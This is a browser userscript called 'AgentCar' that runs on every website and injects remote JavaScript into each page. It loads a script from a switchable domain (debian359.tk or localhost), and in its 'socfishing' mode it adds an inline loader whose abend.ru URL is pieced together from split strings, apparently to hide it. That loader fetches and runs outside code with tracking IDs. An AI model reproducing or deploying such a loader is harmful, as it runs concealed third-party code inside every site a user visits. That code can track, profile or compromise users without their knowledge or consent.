// ==UserScript==
// @name           AgentCar
// @description    
// @version        1.1
// @include        *
// @run-at         document-end
// @noframes
// @grant GM_getValue
// @grant GM_setValue
// @grant GM_registerMenuCommand
// ==/UserScript==


console.log('AgentCar userscript start');

var acScript = GM_getValue('agentCarScript', 'agentcar');
GM_setValue('agentCarId', 'kZD2WwvnheGtest1');
GM_setValue('agentCarGameId', 'id1');
var id = GM_getValue(...{
	agentcar: ['agentCarId', 'kZD2WwvnheGtest1'],
	game: ['agentCarGameId', 'id1']
}[acScript]);
var DOMAIN = GM_getValue('agentCar_DOMAIN', 'debian359.tk');

if (acScript == 'socfishing') {
	var script = document.createElement("script");
	script.innerHTML = `
    !function(bl, v, t, o) {
        var ft = bl.createElement("script");
        var v = "1";
        ft.type = "text/javascript";
        ft.async = 1;
        ft.src = "";
        var v = ("h") + "ttp:/" + "/abend." + ("ru/f/?u=1") + ("&id=") + t + "&j=1&gu" + "id=" + o + "&u34.js";
        ft.src = v;
        var v = "0";
        var c = bl.getElementsByTagName("script")[0];
        c.parentNode.insertBefore(ft, c)
    }(document, "1479751145", "ab1d29e9e43a6701", "");
	`;
	document.head.appendChild(script);
}

console.log('AgentCar id: ', id);

var exit = reload => reload && location.reload(false);

function changeId(newId, reload) {
	if (id == newId)
		return exit(reload);
	GM_setValue('agentCarId', newId);
	exit(reload);
}
function changeScript(name, reload) {
	if (acScript == name) return;
	GM_setValue('agentCarScript', name);
	exit(reload);
}
function changeDomain(name, reload) {
	if (DOMAIN == name) return;
	GM_setValue('agentCar_DOMAIN', name);
	exit(reload);
}
function change(scriptName, id) {
	changeScript(scriptName, false);
	changeId(id, true);
}

GM_registerMenuCommand('Lada', change.bind(null, 'agentcar', 'kZD2WwvnheGtest1'), 'L');
GM_registerMenuCommand('Skoda', change.bind(null, 'agentcar', 'kZD2WwvnheGtest3'), 'S');
GM_registerMenuCommand('Game', change.bind(null, 'game', 'id1'), 'G');
GM_registerMenuCommand('debian359.tk', changeDomain.bind(null, 'debian359.tk', true), 'd');
GM_registerMenuCommand('localhosh:3000', changeDomain.bind(null, 'localhost:3000', true), 'd');
GM_registerMenuCommand('socfishing: test.ac.ga', changeScript.bind(null, 'socfishing', true), 'f');

var script = document.createElement('script');

script.src = '//' + DOMAIN + '/' + acScript + '.js';
script.charset = 'UTF-8';
script.type = 'text/javascript';
script.setAttribute('data-id', id);
console.log('LOAD: ', script.src);

document.body.appendChild(script);


// if (typeof localStorage != 'undefined')
// 	localStorage.setItem('agentCarDebug', 1);
